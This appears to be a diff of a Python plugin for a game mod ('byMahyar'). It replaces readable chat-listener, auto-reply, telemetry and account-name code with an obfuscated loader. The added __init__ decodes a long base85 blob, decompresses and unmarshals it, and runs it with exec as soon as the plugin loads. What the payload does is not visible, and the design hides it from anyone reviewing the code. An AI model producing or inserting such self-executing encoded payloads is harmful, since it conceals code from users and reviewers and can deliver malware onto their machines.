+    '1{7DMDE<cY;4medfQ$5FB~q#sQ8ftS)pF-8-Hs&*r<FWWG(D!2S5rzYrW_eR0x>9TO+o$@{ES~Cg;j&Dfzg~CYA8^raj<+^^fHK7' +
+    'im_ib;)~MJw?b!pfm7({{{Z5C1!8*2SbwodQBT>We^2S~*oKpA3Fs4r<Cijqv6N`aLeQ&_O0f*-qe@aUo3D+4I4daT&c)(iz<}Zd' +
+    'V=wAcTn4)Rmo5YO!He<V2+ZX*zC-|-lwkY_dGeeQb9tnQ97SFoeAU5MBK~DV*!TeHAE2rSsQLl2JV16LA0g)>)VXeSCG=UrVB<1^' +
+    'ezGUa1CrdSAVUqIw4I@j@Jy7VbyBY@D*_^aBclw}_@*U>f-UJNMOh6Jb(2z7%dlBW#uQvrmzq#;s3pCJVI8ZlXPDHFD%iUt^<@Qz' +
+    'TGRau8z7asDObg?&6VP_1zbmFj0$evl^$l;h(rTvc{RgUXL4M@I|9=K3U2F~i7{+q_00@h-6^|*{h_p|;N3kl*BG`Sv1+nEYh~E(' +
+    'Ni{0CzB%2b;PBqN0>d`Aes@-4n6zJ$1Dr5r-H6zfqciqJd(Q&0!rr3SX1W*cz3@eHEg(zA<yk;>S);*z*+%BFvQdKr6;QB%L|h|V' +
+    'L~Px#@B|qJQfAWN2H8f-G`LZ=X>he{6R=G-i3C{$EK!uRAZKX$t24rqW6uJz-FF1H`(kaF?oAIbS;Gm_M-KOm5h$~}ZuCQ=ty032' +
+    '@zyRNSH|gHKvKqLPng$DQlctjwkC|3YD>b9F<Ssx6NZmG%}buvMdVEACqI`l+eop=mZ)0y)GZ)q##uuyunq-<zHpGfu#qRNt4;_R' +
+    'eN{q}sg@E3GPGP!GXv6|vAdxiE-zrXB^kSk>WsrlPL(x!?8&={@rrW@q}+#{*eizx93l^RN81AOYzP`0!{jm5g%kQ^<dro((uXk|' +
+    'Ad;vZ=_*c`WsL#XZg};$M|NxRuDpGO!v}K+Wd4fKf}J@;ME)f910*6pfcIlx4iS<6I`%;+5&0N)0VE>d-2umm$e+PAa4{nC`-d?;' +
+    'Mw&`L@?+dV?8+e`@-eP-;sk~>LFTXUS1}Ic5J>q7ugA6xw;$Ig-&l1t{mId^L7Gxan$n4TbBKuid1BP!wj2T}ALr<Bkg&9|tAqU5' +
+    'GgyOn$hInMmTP-(mmJ4D88gOK>>-DS$Q`n0IApQCcm3Pf7rd`6nO{#BWsMEH<rXhFdtW;a6Qe`GyJeGryEdFL4mTwSK1J|JmEL~<' +
+    '=o%ib'
+)
+
 class byMahyar(Plugin):
-    def __init__(s):
-        global my_own_name, ping_thread
-        if ping_thread is None or not ping_thread.is_alive():
-            ping_thread = RealPingThread()
-            ping_thread.start()
-        try: my_own_name = APP.plus.get_v1_account_name()
-        except: my_own_name = None
-
-        _start_telemetry()
-        s.last_msg_hash = ""
-        s.last_calc_hash = ""
-
-        teck(0.01, s.ear)
-        teck(0.5, s.calc_ear)
-        teck(0.05, sellcek)
-        teck(1, s.reconnect_ear)
-
-        from bauiv1lib import party
-        o = party.PartyWindow.__init__
-
-        def e(self, *a, **k):
-            r = o(self, *a, **k)
-            teck(0.5, get_my_ids)
-
-            default_x = self._width - 150
-            default_y = self._height - 155
-            saved_x, saved_y = get_mods_button_position(default_x, default_y)
-
-            try:
-                saved_x = float(saved_x)
-                saved_y = float(saved_y)
-            except:
-                saved_x, saved_y = float(default_x), float(default_y)
-
-            b_mods = AR.bw(
-                position=(saved_x, saved_y),
-                parent=self._root_widget,
-                size=(128, 28),
-                label='Create By Mahyar',
-                color=(0.05, 0.62, 0.32),
-                text_scale=0.58
-            )
-            bw(b_mods, on_activate_call=lambda: s.delayed_open(ModsMenu, b_mods))
-
-            return r
-
-        party.PartyWindow.__init__ = e
-
-    def ear(s):
-        global _last_seen_messages
-        try:
-            z = GCM()
-            teck(0.01, s.ear)
-            current = list(z or [])
-            new_msgs = _collect_new_messages(current, _last_seen_messages)
-            _last_seen_messages = current
-
-            for msg in new_msgs:
-                try:
-                    if check_spam_command(msg):
-                        continue
-                except Exception:
-                    pass
-                try:
-                    if check_auto_reply(msg):
-                        continue
-                except Exception:
-                    pass
-                try:
-                    if check_filter(msg):
-                        continue
-                except Exception:
-                    pass
-                try:
-                    check_reaction(msg)
-                except Exception:
-                    pass
-        except Exception as e:
-            try:
-                teck(0.05, s.ear)
-            except Exception:
-                pass
-            print(f"Error in ear: {e}")
-
-    def calc_ear(s):
-        try:
-            z = GCM()
-            teck(0.3, s.calc_ear)
-
-            if not z:
-                s.last_calc_hash = ""
-                return
-
-            current_count = len(z)
-            last_msg = z[-1]
-            current_hash = f"{current_count}_{len(last_msg)}_{last_msg}"
-
-            if current_hash == s.last_calc_hash:
-                return
-
-            s.last_calc_hash = current_hash
-
-            try:
-                content = last_msg
-                if ': ' in last_msg:
-                    _, content = last_msg.split(': ', 1)
-                content = content.strip()
-                result = detect_calculation(content)
-                if result:
-                    safe_chat_send(result)
-            except: pass
-        except Exception as e:
-            try:
-                teck(0.3, s.calc_ear)
-            except:
-                pass
-            print(f"Error in calc_ear: {e}")
-
-    def reconnect_ear(s):
-        try:
-            teck(2.0, s.reconnect_ear)
-            auto_reconnect_check()
-        except Exception as e:
-            try:
-                teck(2.0, s.reconnect_ear)
-            except:
-                pass
-            print(f"Error in reconnect_ear: {e}")
-
-    def delayed_open(s, cls, btn):
-        teck(0.05, lambda: cls(btn))
+    """Plugin entry point; implementation is packaged in an encoded payload."""
+    def __init__(self):
+        namespace = globals()
+        exec(_marshal.loads(_zlib.decompress(_b64.b85decode(_PAYLOAD))), namespace)
+        hidden_class = namespace['_HiddenPlugin']
+        self._implementation = hidden_class()
+        self._implementation.__init__()
